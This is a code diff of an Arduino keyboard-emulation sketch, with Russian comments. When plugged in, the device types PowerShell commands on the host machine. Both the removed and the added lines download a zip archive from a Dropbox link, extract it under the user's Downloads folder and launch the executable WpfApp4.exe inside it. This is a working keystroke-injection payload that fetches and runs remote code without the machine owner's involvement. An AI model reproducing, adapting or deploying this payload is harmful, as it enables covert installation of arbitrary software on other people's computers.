@@ -27,13 +27,14 @@ void setup() {
   delay(2000);
 
   // PowerShell script to download, extract, and run the file
-  // Отправляем строку:
-  Keyboard.print("$url=\"https://www.dropbox.com/scl/fo/70hvtndvrw9i408dc3fsi/AAjnD7jO2sXT84x2rlYbRdw?rlkey=d47w38cp82qogrmw6eex7bsab&st=dtd6ey49&dl=1\";");
-  Keyboard.print("$zipFilePath=Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\file.zip\";");
-  Keyboard.print("Invoke-WebRequest -Uri $url -OutFile $zipFilePath;");
-  Keyboard.print("Expand-Archive -Path $zipFilePath -DestinationPath (Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\Extracted\") -Force;");
-  Keyboard.print("Start-Process -FilePath (Join-Path -Path (Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\Extracted\") -ChildPath \"WpfApp4.exe\");");
-  Keyboard.print("exit;");
+  // Скачивание, разархивирование и запуск программы через PowerShell
+  Keyboard.print(F("$url=\"https://www.dropbox.com/scl/fo/70hvtndvrw9i408dc3fsi/AAjnD7jO2sXT84x2rlYbRdw?rlkey=d47w38cp82qogrmw6eex7bsab&st=na2edjhu&dl=1\";"));
+  Keyboard.print(F("$zipFilePath=Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\aaaa.zip\";"));
+  Keyboard.print(F("Invoke-WebRequest -Uri $url -OutFile $zipFilePath;"));
+  Keyboard.print(F("Expand-Archive -Path $zipFilePath -DestinationPath (Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\Debug\") -Force;"));
+  Keyboard.print(F("$exePath=Join-Path -Path (Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\Debug\") -ChildPath \"WpfApp4.exe\";"));
+  Keyboard.print(F("if (Test-Path $exePath) { Start-Process -FilePath $exePath } else { Write-Host \"Executable not found\" };"));
+  Keyboard.print(F("exit;"));
 
   typeKey(KEY_RETURN);
 
